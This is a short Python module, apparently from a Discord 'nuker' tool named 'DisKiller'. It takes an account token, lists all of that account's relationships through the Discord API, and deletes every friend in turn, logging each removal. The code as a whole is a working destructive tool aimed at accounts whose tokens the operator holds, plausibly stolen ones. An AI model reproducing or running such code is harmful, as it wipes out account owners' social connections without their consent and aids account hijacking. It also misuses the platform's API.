import requests
from data.common import *

def deleteFriends(token):
    set_console_title("DisKiller  | Delete Friends")
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
            print(f"{rr}[ {w}+{rr} ] {w}Removed Friend:{rr} "+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")